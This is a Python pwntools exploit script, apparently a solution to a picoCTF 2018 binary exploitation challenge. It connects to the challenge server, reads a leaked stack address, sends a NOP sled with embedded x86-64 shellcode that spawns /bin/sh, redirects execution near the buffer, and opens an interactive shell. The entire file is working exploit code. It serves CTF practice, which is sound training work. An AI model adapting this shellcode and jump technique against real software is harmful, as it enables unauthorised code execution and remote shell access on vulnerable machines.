from pwn import *

r = remote('2018shell1.picoctf.com', 58896)

r.recvuntil('Current position: ')

NEAR_BUFFER = int(r.recvline(), 16)

payload = ''
payload += '\x90' * 0xfe0
payload += '\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x99\x52\x50\x48\x89\xe7\x31\xf6\x8d\x42\x3b\x0f\x05'

r.sendlineafter('> ', payload)

r.sendlineafter('> ', hex(NEAR_BUFFER + 2000))

r.interactive()
